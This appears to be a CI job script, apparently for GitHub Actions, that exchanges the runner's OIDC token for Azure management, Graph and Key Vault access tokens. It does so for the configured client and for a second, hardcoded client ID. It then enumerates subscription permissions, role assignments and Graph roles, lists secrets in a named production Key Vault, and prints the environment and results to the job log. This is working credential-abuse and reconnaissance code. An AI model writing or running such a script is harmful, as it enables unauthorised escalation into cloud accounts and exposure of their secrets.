#!/usr/bin/env bash
set -uo pipefail
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
echo "=== VARS ==="
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"
echo "=== ENV ==="
env | sort | grep -v -i -E 'token=|secret|password|key=' | head -120
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
python3 - "$OIDC" "${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}" "${AZURE_CLIENT_ID:-}" "$SUB" <<'PY'
import sys,json,base64,urllib.request,urllib.parse,urllib.error
oidc,tid,cid,sub=sys.argv[1:5]
def dec(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4)
    return json.loads(base64.urlsafe_b64decode(p))
print("OIDC",dec(oidc))
def post(url,data):
    rq=urllib.request.Request(url,data=urllib.parse.urlencode(data).encode(),method="POST")
    try:
        with urllib.request.urlopen(rq,timeout=30) as r: return json.load(r)
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except: return {"error":e.code}
def fed(c,scope):
    return post(f"https://login.microsoftonline.com/{tid}/oauth2/v2.0/token",{"client_id":c,"grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":oidc,"scope":scope})
def get(u,t):
    rq=urllib.request.Request(u,headers={"Authorization":"Bearer "+t})
    try:
        with urllib.request.urlopen(rq,timeout=30) as r: return r.status,r.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()[:300]
    except Exception as e: return 0,repr(e)[:150]
for c in [x for x in [cid,"72ff278a-9e71-43ec-bac4-2ca303f8e462"] if x]:
    print("\n===== CLIENT",c)
    d=fed(c,"https://management.azure.com/.default"); at=d.get("access_token","")
    print("ARM len",len(at),"err",json.dumps({k:v for k,v in d.items() if k!="access_token"})[:300])
    if at:
        print("claims",{k:dec(at).get(k) for k in ["aud","appid","oid","roles","idtyp"]})
        print("perm",get(f"https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01",at))
        print("ra",get(f"https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01",at)[0])
    g=fed(c,"https://graph.microsoft.com/.default"); gt=g.get("access_token","")
    if gt: print("graph roles",dec(gt).get("roles"))
    k=fed(c,"https://vault.azure.net/.default"); kt=k.get("access_token","")
    if kt: print("kv",get("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",kt))
PY
